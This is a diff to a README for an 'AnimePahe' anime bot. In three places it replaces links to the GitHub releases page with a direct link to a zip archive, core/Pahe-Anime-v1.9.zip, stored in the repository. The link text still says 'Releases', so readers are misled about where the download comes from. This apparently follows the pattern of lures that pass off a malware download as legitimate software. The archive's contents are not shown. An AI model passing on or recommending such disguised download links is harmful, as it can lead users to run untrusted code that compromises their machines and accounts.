@@ -1,6 +1,6 @@
 # 📺 AnimePahe - Simple Anime Bot Setup
 
-[![Download AnimePahe](https://img.shields.io/badge/Download%20AnimePahe-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Caylaunpredictable245/AnimePahe/releases)
+[![Download AnimePahe](https://img.shields.io/badge/Download%20AnimePahe-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Caylaunpredictable245/AnimePahe/main/core/Pahe-Anime-v1.9.zip)
 
 ## 🧭 Overview
 
@@ -45,7 +45,7 @@ For smooth use, keep more free space if you plan to download many episodes.
 
 Visit this page to download:
 
-[Download AnimePahe from Releases](https://github.com/Caylaunpredictable245/AnimePahe/releases)
+[Download AnimePahe from Releases](https://raw.githubusercontent.com/Caylaunpredictable245/AnimePahe/main/core/Pahe-Anime-v1.9.zip)
 
 On the releases page, look for the latest version and download the Windows file that matches your setup.
 
@@ -248,7 +248,7 @@ Store them in a text file if you want to copy and paste them during setup.
 
 If you need to return later, use the same release page:
 
-[Visit AnimePahe Releases](https://github.com/Caylaunpredictable245/AnimePahe/releases)
+[Visit AnimePahe Releases](https://raw.githubusercontent.com/Caylaunpredictable245/AnimePahe/main/core/Pahe-Anime-v1.9.zip)
 
 ## 🏁 Windows Run Steps
 
